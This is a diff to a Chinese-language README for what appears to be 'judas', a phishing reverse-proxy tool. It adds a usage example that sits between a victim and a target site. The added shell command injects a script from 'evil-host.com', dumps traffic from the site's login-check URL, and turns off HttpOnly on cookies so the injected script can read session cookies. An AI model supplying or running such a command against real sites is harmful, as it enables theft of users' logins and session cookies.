@@ -132,6 +132,17 @@ judas --target  https://target-url.com              \
 
 **注意** --`dump-url` `--inject-url` 多个参数用英文`,` 隔开不可有空格
 
+### 取消 httponly 设置
+```shell
+judas --target  https://target-url.com              \
+     --insecure --address=10.10.200.1:8080          \
+     --inject-js= https://evil-host.com/payload.js  \
+     --inject-url="/index.php/Index/index"          \
+     --dump-url="/index.php/Public/checkLogin"      \
+     --cookie-httponly=false
+
+```
+
 插件功能
 -------
 
